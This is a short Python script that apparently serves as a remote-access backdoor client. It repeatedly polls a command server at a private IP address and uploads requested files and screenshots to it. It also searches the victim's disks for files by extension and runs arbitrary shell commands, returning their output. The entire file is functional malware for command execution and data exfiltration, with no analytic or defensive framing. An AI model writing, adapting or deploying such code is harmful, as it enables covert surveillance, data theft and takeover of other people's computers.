import requests
import subprocess
import time
import os
import tempfile
import shutil
from PIL import ImageGrab


while True:
    req = requests.get('http://192.168.233.128')
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab,path = command.split('*')
        if os.path.exists(path):
            url = 'http://192.168.233.128/store'
            files = {'file': open(path,'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.233.128',data='[-] File not found')

    elif 'screencap' in command:
        #Create a temporary directory to store image before we transfer it to the server
        tmppath = tempfile.mkdtemp()
        
        ImageGrab.grab().save(tmppath + "\img.jpg", "JPEG")
        url = 'http://192.168.233.128/store'
        files = {'file': open(tmppath + "\img.jpg", "rb")}
        r = requests.post(url, files=files)
        files['file'].close()
        shutil.rmtree(tmppath)

    elif 'search' in command:
        #Search command will take the formart "search C:\\*.pdf" i.e. you start by specifying the directory to search in followed by the file extension
        command = command[7:]
        path, ext = command.split('*')

        list = ''

        for dirpath, dirname, files in os.walk(path):
            for file in files:
                if file.endswith(ext):
                    list = list + '\n' + os.path.join(dirpath, file)
        requests.post(url = 'http://192.168.233.128', data=list)
        
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stdout.read())
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stderr.read())

    time.sleep(2)
